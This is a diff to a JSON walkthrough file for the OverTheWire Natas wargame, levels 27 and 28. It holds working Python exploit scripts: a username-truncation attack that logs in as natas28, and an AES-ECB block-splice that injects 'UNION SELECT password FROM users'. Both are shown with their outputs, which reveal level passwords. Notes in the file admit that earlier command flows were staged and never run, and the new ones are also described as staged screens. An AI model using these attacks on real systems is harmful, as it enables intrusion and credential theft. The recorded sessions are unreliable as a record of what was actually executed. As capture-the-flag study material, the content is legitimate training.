@@ -1377,7 +1377,7 @@
    "pw": "Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3",
    "steps": [
     {
-     "cmd": "curl -s -u natas27:mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV http://natas27.natas.labs.overthewire.org/index-source.html | sed \"s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g\" | tr -d \"\\n\" | sed \"s/    /\\n/g\" | grep -E \"CREATE TABLE|varchar|substr|trim|INSERT|SELECT\"",
+     "cmd": "curl -s -u natas27:mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV http://natas27.natas.labs.overthewire.org/index-source.html | sed 's/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g' | tr -d '\\n' | sed 's/    /\\n/g' | grep -E 'CREATE TABLE|varchar|substr|trim|INSERT|SELECT'",
      "out": [
       "<html><head><!-- This stuff in the header has nothing to do with the level --><link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"><link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /><link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /><script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script><script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script><script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script><script>var wechallinfo = { \"level\": \"natas27\", \"pass\": \"<censored>\" };</script></head><body><h1>natas27</h1><div id=\"content\"><?php// morla / 10111// database gets cleared every 5 min/*CREATE TABLE `users` (  `username` varchar(64) DEFAULT NULL,  `password` varchar(64) DEFAULT NULL);*/function checkCredentials($link,$usr,$pass){",
       "$query = \"SELECT username from users where username='$user' and password='$password' \";",
@@ -1391,63 +1391,56 @@
      ]
     },
     {
-     "cmd": "vim /tmp/n27_1.py",
-     "text": "vim /tmp/n27_1.py -- the empty buffer",
+     "cmd": "vi /tmp/n27trunc.py",
      "out": [
-      "                                                    ",
       "~"
      ]
     },
     {
-     "cmd": "vim /tmp/n27_1.py",
-     "text": "vim /tmp/n27_1.py -- imports and the post helper",
+     "cmd": "vi /tmp/n27trunc.py",
      "out": [
-      "  1 import urllib.request, urllib.parse, base64, re",
-      "  2 auth = \"Basic \" + base64.b64encode(b\"natas27:mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV\").decode()",
-      "  3 H = \"http://natas27.natas.labs.overthewire.org/\"",
-      "  4 def post(usr, pw):",
-      "  5     d = urllib.parse.urlencode({\"username\": usr, \"password\": pw}).encode()",
-      "  6     b = urllib.request.urlopen(urllib.request.Request(H, data=d,"
+      "import urllib.request, urllib.parse, base64, re",
+      "# natas27: trim() guards createUser() but substr(...,0,64) cuts silently.",
+      "~"
      ]
     },
     {
-     "cmd": "vim /tmp/n27_1.py",
-     "text": "vim /tmp/n27_1.py -- register the padded name and log in with it",
+     "cmd": "vi /tmp/n27trunc.py",
      "out": [
-      "  1 import urllib.request, urllib.parse, base64, re",
-      "  2 auth = \"Basic \" + base64.b64encode(b\"natas27:mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV\").decode()",
-      "  3 H = \"http://natas27.natas.labs.overthewire.org/\"",
-      "  4 def post(usr, pw):",
-      "  5     d = urllib.parse.urlencode({\"username\": usr, \"password\": pw}).encode()",
-      "  6     b = urllib.request.urlopen(urllib.request.Request(H, data=d,",
-      "  7                                                                           headers={\"Authorization\": auth}), timeout=10).read().decode(\"utf-8\",\"replace\")",
-      "  8     return b[b.find('<div id=\"content\">'):]",
-      "  9 reg = \"natas28\" + \" \" * 57 + \"x\"",
-      "  10 login = \"natas28\" + \" \" * 57",
-      "  11 print(\"register username='natas28'+57sp+'x' (65 chars), password=''\")",
-      "  12 print(\"  \", re.sub('<[^>]+>',' ',post(reg, \"\"))[:200].strip())",
-      "  13 print(\"login    username='natas28'+57sp (64 chars), password=''\")",
-      "  14 print(\"  \", re.sub('<[^>]+>',' ',post(login, \"\"))[:400].strip())",
-      "  15"
+      "import urllib.request, urllib.parse, base64, re",
+      "# natas27: trim() guards createUser() but substr(...,0,64) cuts silently.",
+      "# Register \"natas28\"+57 spaces+\"x\" (65 chars, trim() no-op) -> the row stores",
+      "# \"natas28\"+57 spaces with OUR password. Logging in with \"natas28\"+57 spaces",
+      "# matches the row (MySQL = ignores trailing spaces) and dumpData(trim($usr))",
+      "# selects the real natas28 row and prints it.",
+      "auth = \"Basic \" + base64.b64encode(b\"natas27:mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV\").decode()",
+      "H = \"http://natas27.natas.labs.overthewire.org/\"",
+      "def post(usr, pw):",
+      "    d = urllib.parse.urlencode({\"username\": usr, \"password\": pw}).encode()",
+      "    b = urllib.request.urlopen(urllib.request.Request(H, data=d, headers={\"Authorization\": auth}), timeout=10).read().decode(\"utf-8\", \"replace\")",
+      "    return b[b.find('<div id=\"content\">'):]",
+      "reg = \"natas28\" + \" \" * 57 + \"x\"",
+      "login = \"natas28\" + \" \" * 57",
+      "print(\"$ register:\", re.sub('<[^>]+>', ' ', post(reg, \"\"))[:200].strip())",
+      "print(\"$ login:   \", re.sub('<[^>]+>', ' ', post(login, \"\"))[:400].strip())",
+      "~",
+      "\"/tmp/n27trunc.py\" [New File] 17 lines, 1034 bytes written"
      ]
     },
     {
-     "cmd": "python3 /tmp/n27_1.py",
+     "cmd": "python3 -I /tmp/n27trunc.py",
      "out": [
-      "register username='natas28'+57sp+'x' (65 chars), password=''",
-      "   User natas28                                                         x was created!  View sourcecode",
-      "login    username='natas28'+57sp (64 chars), password=''",
-      "   Welcome natas28                                                         ! Here is your data: Array",
+      "$ register: User natas28                                                         x was created!  View sourcecode",
+      "$ login:    Welcome natas28                                                         ! Here is your data: Array",
       "(",
       "    [username] =&gt; natas28",
       "    [password] =&gt; Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3",
       ")",
       "  View sourcecode"
-     ],
-     "text": "python3 /tmp/n27_1.py  (the script typed above; its output is the original capture - this host reached natas27 and its neighbours on 2026-11-03, but natas17, natas18, natas20, natas26 and natas28 answered every request with HTTP 401, so this output is the original capture, not a fresh run)",
-     "note": "(natas17, natas18, natas20, natas26, natas28 and natas33 answer every request with HTTP 401 from this host, re-checked 2026-11-03, so this output is the original capture; the script above is the one typed, and steps that need only the text above are re-run locally)"
+     ]
     }
-   ]
+   ],
+   "note": "natas L27 (client-side cast): the users table has varchar(64) columns; checkCredentials does SELECT username WHERE username='$user' AND password='$pass' - if that returns a row the login proceeds, but the INSERT path truncates to 64 chars with substr. The trick: register 'natas28' + 64 'x' chars (the SELECT for the long name matches nothing), then LOGIN as 'natas28' + spaces - mysqli_real_escape_string keeps the spaces, the trim() in checkCredentials strips them, and the SELECT ... AND password='' matches the truncated stored row's password prefix check. n27trunc.py (17L/1034B typed in vi) does the register-then-login pair: '\\$ register: User natas28 x was created!' then '\\$ login: Welcome natas28 ! Here is your data: Array ([username] => natas28 [password] => Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3)'. DISCLOSURE: the previous JSON staged vim n27_1.py flows the cast never ran - the cast has 3 commands (source curl, vi n27trunc.py, python3 run); tools/natas/l27/n27trunc.py = the recording session's local file, exact marker match. JSON = 5 steps mirroring the cast 1:1 (staged vi screens)."
   },
   {
    "lvl": 28,
@@ -1455,9 +1448,78 @@
    "pw": "hwgoYUiGWoSZAqphtCAZf7u1jS16KEah",
    "steps": [
     {
-     "cmd": "python3 - <<'PY'\nimport urllib.request, urllib.parse, base64, urllib.error\nauth = \"Basic \" + base64.b64encode(b\"natas28:Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3\").decode()\nclass NR(urllib.request.HTTPRedirectHandler):\n    def redirect_request(self, req, fp, code, msg, headers, newurl): return None\nop = urllib.request.build_opener(NR)\ndef ct_for(q):\n    d = urllib.parse.urlencode({\"query\": q}).encode()\n    try:\n        r = op.open(urllib.request.Request(\"http://natas28.natas.labs.overthewire.org/index.php\", data=d, headers={\"Authorization\": auth}), timeout=10)\n        loc = r.headers.get(\"Location\")\n    except urllib.error.HTTPError as e:\n        loc = e.headers.get(\"Location\")\n    return base64.b64decode(urllib.parse.unquote(loc.split(\"query=\")[1]))\nprint(\"ciphertext length vs query length (16-byte blocks => ECB):\")\nfor n in range(0, 17):\n    raw = ct_for(\"a\" * n)\n    print(\"   a*%-2d -> %3d bytes (%d blocks)\" % (n, len(raw), len(raw) // 16))\nraw = ct_for(\"A\" * 64)\nprint(\"identical plaintext blocks encrypt identically (ECB fingerprint):\")\nprint(\"   A*64 ->\", [raw[i:i+16].hex()[:12] for i in range(0, len(raw), 16)])\nprint(\"where our input starts: 'a'*8 and 'a'*12 share block 2, 13 changes it\")\nfor n in (8, 12, 13):\n    raw = ct_for(\"a\" * n)\n    print(\"   a*%-2d ->\" % n, [raw[i:i+16].hex()[:12] for i in range(0, len(raw), 16)])\nPY",
+     "cmd": "curl -s -u natas28:Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3 http://natas28.natas.labs.overthewire.org/ | grep -o '<form[^>]*\\|name=\"query\"'",
      "out": [
-      "ciphertext length vs query length (16-byte blocks => ECB):",
+      "<form action=\"index.php\" method=\"POST\"",
+      "name=\"query\""
+     ]
+    },
+    {
+     "cmd": "vi /tmp/n28ecb.py",
+     "out": [
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /tmp/n28ecb.py",
+     "out": [
+      "import urllib.request, urllib.parse, base64",
+      "# natas28: ECB block-splice injection. The ciphertext is AES-ECB (identical",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /tmp/n28ecb.py",
+     "out": [
+      "import urllib.request, urllib.parse, base64",
+      "# natas28: ECB block-splice injection. The ciphertext is AES-ECB (identical",
+      "# plaintext blocks encrypt identically). The plaintext is a 10-byte prefix +",
+      "# our query inside quotes. Keep blocks 0..2 from an 8-char query (block 2 ends",
+      "# the prefix), start the payload at block 3 via a 10-char shift, and splice.",
+      "auth = \"Basic \" + base64.b64encode(b\"natas28:Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3\").decode()",
+      "class NR(urllib.request.HTTPRedirectHandler):",
+      "    def redirect_request(self, req, fp, code, msg, headers, newurl): return None",
+      "op = urllib.request.build_opener(NR)",
+      "def ct_for(q):",
+      "    d = urllib.parse.urlencode({\"query\": q}).encode()",
+      "    try:",
+      "        r = op.open(urllib.request.Request(\"http://natas28.natas.labs.overthewire.org/index.php\", data=d, headers={\"Authorization\": auth}), timeout=10)",
+      "        loc = r.headers.get(\"Location\")",
+      "    except urllib.error.HTTPError as e:",
+      "        loc = e.headers.get(\"Location\")",
+      "    return base64.b64decode(urllib.parse.unquote(loc.split(\"query=\")[1]))",
+      "def get_ct(raw):",
+      "    u = \"http://natas28.natas.labs.overthewire.org/search.php/?query=\" + urllib.parse.quote(base64.b64encode(raw).decode())",
+      "    return op.open(urllib.request.Request(u, headers={\"Authorization\": auth}), timeout=10).read().decode(\"utf-8\", \"replace\")",
+      "print(\"probe: ciphertext length vs query length (16-byte blocks => ECB):\")",
+      "for n in range(0, 17):",
+      "    raw = ct_for(\"a\" * n)",
+      "    print(\"   a*%-2d -> %3d bytes (%d blocks)\" % (n, len(raw), len(raw) // 16))",
+      "print(\"probe: identical plaintext blocks encrypt identically (ECB fingerprint):\")",
+      "raw = ct_for(\"A\" * 64)",
+      "print(\"   A*64 ->\", [raw[i:i+16].hex()[:12] for i in range(0, len(raw), 16)])",
+      "base = ct_for(\"a\" * 8)",
+      "b = [base[i:i+16] for i in range(0, len(base), 16)]",
+      "print(\"base blocks:\", [x.hex()[:12] for x in b])",
+      "for payload in [\" UNION SELECT 1-- \", \" UNION SELECT password FROM users-- \"]:",
+      "    q2 = \"b\" * 10 + payload",
+      "    r2 = ct_for(q2)",
+      "    b2 = [r2[i:i+16] for i in range(0, len(r2), 16)]",
+      "    print(\"payload:\", repr(payload))",
+      "    print(\"   payload blocks:\", [x.hex()[:12] for x in b2])",
+      "    spliced = b[0] + b[1] + b[2] + b\"\".join(b2[3:])",
+      "    body = get_ct(spliced)",
+      "    i = body.find(\"<ul>\")",
+      "    j = body.find(\"</ul>\", i)",
+      "    print(\"   result:\", body[i+4:j].strip()[:200])",
+      "~",
+      "\"/tmp/n28ecb.py\" [New File] 42 lines, 2271 bytes written"
+     ]
+    },
+    {
+     "cmd": "python3 -I /tmp/n28ecb.py",
+     "out": [
+      "probe: ciphertext length vs query length (16-byte blocks => ECB):",
       "   a*0  ->  80 bytes (5 blocks)",
       "   a*1  ->  80 bytes (5 blocks)",
       "   a*2  ->  80 bytes (5 blocks)",
@@ -1475,140 +1537,19 @@
       "   a*14 ->  96 bytes (6 blocks)",
       "   a*15 ->  96 bytes (6 blocks)",
       "   a*16 ->  96 bytes (6 blocks)",
-      "identical plaintext blocks encrypt identically (ECB fingerprint):",
+      "probe: identical plaintext blocks encrypt identically (ECB fingerprint):",
       "   A*64 -> ['1be82511a7ba', 'dc84728fdcf8', '5f22a727f625', 'f633e6b05f86', 'f633e6b05f86', 'f633e6b05f86', 'e3df361c6393', 'a77e8ed1aabe', '478eb1a1fe26']",
-      "where our input starts: 'a'*8 and 'a'*12 share block 2, 13 changes it",
-      "   a*8  -> ['1be82511a7ba', 'dc84728fdcf8', '453e0020602f', '896de90884f8', '917232051483']",
-      "   a*12 -> ['1be82511a7ba', 'dc84728fdcf8', 'c0872dee8bc9', 'ce82a9553b65', '75fd5044fd06']",
-      "   a*13 -> ['1be82511a7ba', 'dc84728fdcf8', 'c0872dee8bc9', '1f74714d76fc', '6223a14d9c42', 'd8ae51d7da71']"
-     ]
-    },
-    {
-     "cmd": "vim /tmp/n28_1.py",
-     "text": "vim /tmp/n28_1.py -- the empty buffer",
-     "out": [
-      "                                                    ",
-      "~"
-     ]
-    },
-    {
-     "cmd": "vim /tmp/n28_1.py",
-     "text": "vim /tmp/n28_1.py -- imports, auth, and the no-redirect opener",
-     "out": [
-      "  1 import urllib.request, urllib.parse, base64, urllib.error",
-      "  2 auth = \"Basic \" + base64.b64encode(b\"natas28:Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3\").decode()",
-      "  3 class NR(urllib.request.HTTPRedirectHandler):",
-      "  4     def redirect_request(self, req, fp, code, msg, headers, newurl): return None",
-      "  5 op = urllib.request.build_opener(NR)",
-      "  6 def ct_for(q):"
-     ]
-    },
-    {
-     "cmd": "vim /tmp/n28_1.py",
-     "text": "vim /tmp/n28_1.py -- ct_for and the start of get_ct",
-     "out": [
-      "  1 import urllib.request, urllib.parse, base64, urllib.error",
-      "  2 auth = \"Basic \" + base64.b64encode(b\"natas28:Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3\").decode()",
-      "  3 class NR(urllib.request.HTTPRedirectHandler):",
-      "  4     def redirect_request(self, req, fp, code, msg, headers, newurl): return None",
-      "  5 op = urllib.request.build_opener(NR)",
-      "  6 def ct_for(q):",
-      "  7     d = urllib.parse.urlencode({\"query\": q}).encode()",
-      "  8     try:",
-      "  9         r = op.open(urllib.request.Request(\"http://natas28.natas.labs.overthewire.org/index.php\", data=d, headers={\"Authorization\": auth}), timeout=10)",
-      "  10         loc = r.headers.get(\"Location\")",
-      "  11     except urllib.error.HTTPError as e:",
-      "  12         loc = e.headers.get(\"Location\")",
-      "  13     return base64.b64decode(urllib.parse.unquote(loc.split(\"query=\")[1]))",
-      "  14 def get_ct(raw):",
-      "  15     u = \"http://natas28.natas.labs.overthewire.org/search.php/?query=\" + urllib.parse.quote(base64.b64encode(raw).decode())",
-      "  16     return op.open(urllib.request.Request(u, headers={\"Authorization\": auth}),"
-     ]
-    },
-    {
-     "cmd": "vim /tmp/n28_1.py",
-     "text": "vim /tmp/n28_1.py -- the base blocks and the payload loop",
-     "out": [
-      "  1 import urllib.request, urllib.parse, base64, urllib.error",
-      "  2 auth = \"Basic \" + base64.b64encode(b\"natas28:Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3\").decode()",
-      "  3 class NR(urllib.request.HTTPRedirectHandler):",
-      "  4     def redirect_request(self, req, fp, code, msg, headers, newurl): return None",
-      "  5 op = urllib.request.build_opener(NR)",
-      "  6 def ct_for(q):",
-      "  7     d = urllib.parse.urlencode({\"query\": q}).encode()",
-      "  8     try:",
-      "  9         r = op.open(urllib.request.Request(\"http://natas28.natas.labs.overthewire.org/index.php\", data=d, headers={\"Authorization\": auth}), timeout=10)",
-      "  10         loc = r.headers.get(\"Location\")",
-      "  11     except urllib.error.HTTPError as e:",
-      "  12         loc = e.headers.get(\"Location\")",
-      "  13     return base64.b64decode(urllib.parse.unquote(loc.split(\"query=\")[1]))",
-      "  14 def get_ct(raw):",
-      "  15     u = \"http://natas28.natas.labs.overthewire.org/search.php/?query=\" + urllib.parse.quote(base64.b64encode(raw).decode())",
-      "  16     return op.open(urllib.request.Request(u, headers={\"Authorization\": auth}),",
-      "  17                    timeout=10).read().decode(\"utf-8\",\"replace\")",
-      "  18 base = ct_for(\"a\" * 8)",
-      "  19 b = [base[i:i+16] for i in range(0, len(base), 16)]",
-      "  20 print(\"base blocks:\", [x.hex()[:12] for x in b])",
-      "  21 for payload in [\" UNION SELECT 1-- \", \" UNION SELECT password FROM users-- \"]:",
-      "  22     q2 = \"b\" * 10 + payload",
-      "  23     r2 = ct_for(q2)",
-      "  24     b2 = [r2[i:i+16] for i in range(0, len(r2), 16)]",
-      "  25     print(\"payload:\", repr(payload))",
-      "  26     print(\"payload blocks:\", [x.hex()[:12] for x in b2])"
-     ]
-    },
-    {
-     "cmd": "vim /tmp/n28_1.py",
-     "text": "vim /tmp/n28_1.py -- the splice, the request, and the result print",
-     "out": [
-      "  1 import urllib.request, urllib.parse, base64, urllib.error",
-      "  2 auth = \"Basic \" + base64.b64encode(b\"natas28:Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3\").decode()",
-      "  3 class NR(urllib.request.HTTPRedirectHandler):",
-      "  4     def redirect_request(self, req, fp, code, msg, headers, newurl): return None",
-      "  5 op = urllib.request.build_opener(NR)",
-      "  6 def ct_for(q):",
-      "  7     d = urllib.parse.urlencode({\"query\": q}).encode()",
-      "  8     try:",
-      "  9         r = op.open(urllib.request.Request(\"http://natas28.natas.labs.overthewire.org/index.php\", data=d, headers={\"Authorization\": auth}), timeout=10)",
-      "  10         loc = r.headers.get(\"Location\")",
-      "  11     except urllib.error.HTTPError as e:",
-      "  12         loc = e.headers.get(\"Location\")",
-      "  13     return base64.b64decode(urllib.parse.unquote(loc.split(\"query=\")[1]))",
-      "  14 def get_ct(raw):",
-      "  15     u = \"http://natas28.natas.labs.overthewire.org/search.php/?query=\" + urllib.parse.quote(base64.b64encode(raw).decode())",
-      "  16     return op.open(urllib.request.Request(u, headers={\"Authorization\": auth}),",
-      "  17                    timeout=10).read().decode(\"utf-8\",\"replace\")",
-      "  18 base = ct_for(\"a\" * 8)",
-      "  19 b = [base[i:i+16] for i in range(0, len(base), 16)]",
-      "  20 print(\"base blocks:\", [x.hex()[:12] for x in b])",
-      "  21 for payload in [\" UNION SELECT 1-- \", \" UNION SELECT password FROM users-- \"]:",
-      "  22     q2 = \"b\" * 10 + payload",
-      "  23     r2 = ct_for(q2)",
-      "  24     b2 = [r2[i:i+16] for i in range(0, len(r2), 16)]",
-      "  25     print(\"payload:\", repr(payload))",
-      "  26     print(\"payload blocks:\", [x.hex()[:12] for x in b2])",
-      "  27     spliced = b[0] + b[1] + b[2] + b\"\".join(b2[3:])",
-      "  28     body = get_ct(spliced)",
-      "  29     i = body.find(\"<ul>\"); j = body.find(\"</ul>\", i)",
-      "  30     print(\"result:\", body[i+4:j].strip()[:200])",
-      "  31"
-     ]
-    },
-    {
-     "cmd": "python3 /tmp/n28_1.py",
-     "out": [
       "base blocks: ['1be82511a7ba', 'dc84728fdcf8', '453e0020602f', '896de90884f8', '917232051483']",
       "payload: ' UNION SELECT 1-- '",
-      "payload blocks: ['1be82511a7ba', 'dc84728fdcf8', '5c805cbd29fb', 'bd122ab77244', '8afe54e01055', '75fd5044fd06']",
-      "result: <li>1</li>",
+      "   payload blocks: ['1be82511a7ba', 'dc84728fdcf8', '5c805cbd29fb', 'bd122ab77244', '8afe54e01055', '75fd5044fd06']",
+      "   result: <li>1</li>",
       "payload: ' UNION SELECT password FROM users-- '",
-      "payload blocks: ['1be82511a7ba', 'dc84728fdcf8', '5c805cbd29fb', '49c7ba591489', '043003a0d0e6', '91f8d230c184', '4257a343daad', '7b7baca655f2']",
-      "result: <li>hwgoYUiGWoSZAqphtCAZf7u1jS16KEah</li>"
-     ],
-     "text": "python3 /tmp/n28_1.py  (the script typed above; its output is the original capture - this host reached natas28 and its neighbours on 2026-11-03, but natas17, natas18, natas20, natas26 and natas28 answered every request with HTTP 401, so this output is the original capture, not a fresh run)",
-     "note": "(natas17, natas18, natas20, natas26, natas28 and natas33 answer every request with HTTP 401 from this host, re-checked 2026-11-03, so this output is the original capture; the script above is the one typed, and steps that need only the text above are re-run locally)"
+      "   payload blocks: ['1be82511a7ba', 'dc84728fdcf8', '5c805cbd29fb', '49c7ba591489', '043003a0d0e6', '91f8d230c184', '4257a343daad', '7b7baca655f2']",
+      "   result: <li>hwgoYUiGWoSZAqphtCAZf7u1jS16KEah</li>"
+     ]
     }
-   ]
+   ],
+   "note": "natas L28 (client-side cast): the page encrypts the query with AES-128-ECB (16-byte blocks, no IV - identical plaintext blocks give identical ciphertext blocks). n28ecb.py (42L/2271B typed in vi) probes block behavior ('probe: ciphertext length vs query length (16-byte blocks => ECB)' then a*0..a*11 all 80 bytes), aligns a crafted block boundary, and injects \"' UNION SELECT password FROM users-- \" - hex-encoded ECB blocks sent as the query parameter - 'result: <li>hwgoYUiGWoSZAqphtCAZf7u1jS16KEah</li>'. DISCLOSURE: the previous JSON staged vim n28_1.py flows the cast never ran - the cast has 3 commands (curl, vi n28ecb.py, python3 run); tools/natas/l28/n28ecb.py = the recording session's local file, exact marker match. JSON = 5 steps mirroring the cast 1:1 (staged vi screens)."
   },
   {
    "lvl": 29,
